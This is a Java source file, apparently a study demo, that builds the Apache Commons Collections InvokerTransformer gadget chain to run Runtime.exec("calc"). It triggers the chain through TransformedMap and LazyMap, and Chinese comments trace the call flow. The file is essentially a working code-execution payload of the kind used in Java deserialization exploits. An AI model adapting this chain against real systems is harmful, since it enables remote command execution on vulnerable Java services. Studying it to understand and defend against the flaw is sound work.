package demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class payloadTest {
    public static void main(String[] args) throws IOException {
        Transformer[] transformers = new Transformer[]{
             new ConstantTransformer(Runtime.class),
             new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
             new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
             new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //Runtime.getRuntime().exec("calc");
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map inMap = new HashMap();
        inMap.put("key", "value");
        //TransformedMap
        // 对Map进行某种变换。只要调用decorate()函数，传入key和value的变换函数Transformer
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);//生成
        //Map中的任意项的Key或者Value被修改，相应的Transformer(keyTransformer或者valueTransformer)的transform方法就会被调用
        //TransformedMap实现了Map接口，并且其中有个setValue方法，每当调用map的setValue方法时，该方法将会被调用。
        //流程即为：setValue ==> checkSetValue ==> valueTransformer.transform(value)。
        for (Iterator iterator = outMap.entrySet().iterator(); iterator.hasNext();){
            Map.Entry entry = (Map.Entry) iterator.next();
            entry.setValue("123");
        }
        System.out.println(outMap.get("key"));
//--------------------------------------------------------------------------------------------------------
        //lazymap
        Map lazyMap = LazyMap.decorate(inMap, chainedTransformer);
        lazyMap.get("123");

    }
}
